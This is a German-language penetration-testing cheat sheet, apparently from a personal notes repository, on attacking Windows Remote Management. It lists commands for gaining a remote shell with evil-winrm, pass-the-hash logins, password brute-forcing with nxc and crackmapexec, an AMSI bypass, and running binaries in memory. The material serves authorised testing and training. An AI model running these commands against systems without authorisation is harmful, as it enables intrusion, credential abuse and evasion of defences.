# 🔧 WinRM (5985 HTTP / 5986 HTTPS)

> Wenn der User in der Gruppe `Remote Management Users` oder `Administrators` ist → Shell.

## Check

```bash
nxc winrm $RHOST -u user -p pass
nxc winrm $RHOST -u user -H <NTLM-HASH>          # Pass-the-Hash

# nmap
nmap -p5985,5986 --script winrm-* $RHOST
```

## Shell mit evil-winrm

```bash
evil-winrm -i $RHOST -u user -p pass
evil-winrm -i $RHOST -u user -H <NTLM-HASH>      # Pass-the-Hash
evil-winrm -i $RHOST -u user -p pass -s ./scripts -e ./exes      # Script/Exe-Dirs
```

## Innerhalb evil-winrm — nützliche Befehle

```
upload localfile remotefile
download remotefile
menu                          # zeigt extra-Befehle
Bypass-4MSI                   # AMSI bypass
Invoke-Binary                 # binary in memory ausführen
```

## Bruteforce

```bash
nxc winrm $RHOST -u users.txt -p passwords.txt --continue-on-success
crackmapexec winrm $RHOST -u users.txt -p passwords.txt
```

→ Nach Shell: [Windows PrivEsc](../../03-PrivEsc/Windows/README.md)
